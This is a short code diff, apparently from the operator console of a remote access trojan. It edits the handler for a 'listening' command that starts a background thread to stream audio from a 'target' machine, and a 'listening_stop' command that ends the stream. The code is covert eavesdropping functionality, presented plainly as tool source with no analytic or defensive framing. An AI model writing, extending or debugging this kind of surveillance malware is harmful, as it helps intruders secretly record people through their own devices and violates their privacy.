@@ -175,9 +175,9 @@ def target_communication():
             if not stream_flag['on']:
                 stream_flag['on'] = True
                 audio_thread = threading.Thread(target=stream_audio_from_target, args=(stream_flag,))
+                audio_thread.daemon = True
                 audio_thread.start()
-            result = reliable_recv()
-            print(result)
+            print("[+] Audio stream started.")
         elif command == 'listening_stop':
             stream_flag['on'] = False
             audio_thread.join()  # Wait for the audio thread to finish
